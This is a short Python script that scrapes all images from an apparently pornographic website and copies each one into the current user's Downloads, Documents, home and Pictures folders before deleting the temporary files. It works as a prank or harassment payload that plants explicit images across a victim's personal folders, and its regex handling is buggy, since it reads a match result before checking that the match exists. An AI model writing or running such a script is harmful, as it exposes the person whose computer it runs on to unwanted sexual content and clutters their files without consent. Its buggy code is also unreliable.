import re
import requests
from bs4 import BeautifulSoup
import os
import shutil

site = 'http://www.pornstarpic.net/'

response = requests.get(site)

soup = BeautifulSoup(response.text, 'html.parser')

# soup = soup.find_all("div", {"class": "container--HcTw2"})[0]
img_tags = soup.find_all('img')

urls = [img['src'] for img in img_tags]
filenames = []
# print(urls)
try:
    os.system("mkdir images")
except:
    pass
for url in urls:
    filename = re.search(r'/([\w_-]+[.](jpg|gif|png))$', url)
    filename = "images/" + filename.group(1)
    filenames.append(filename)
    if not filename:
        print("Regex didn't match with the url: {}".format(url))
        continue
    with open(filename, 'wb') as f:
        if 'http' not in url:
            url = '{}{}'.format(site, url)
        response = requests.get(url)
        f.write(response.content)

targets = ["\Downloads", "\Documents", "", "\Pictures"]

user_profile = os.path.expanduser('~')

for filename in filenames:
    for target in targets:
        user_desktop = user_profile + target
        shutil.copy(filename, user_desktop)
    os.remove(filename)

os.system("rmdir images")
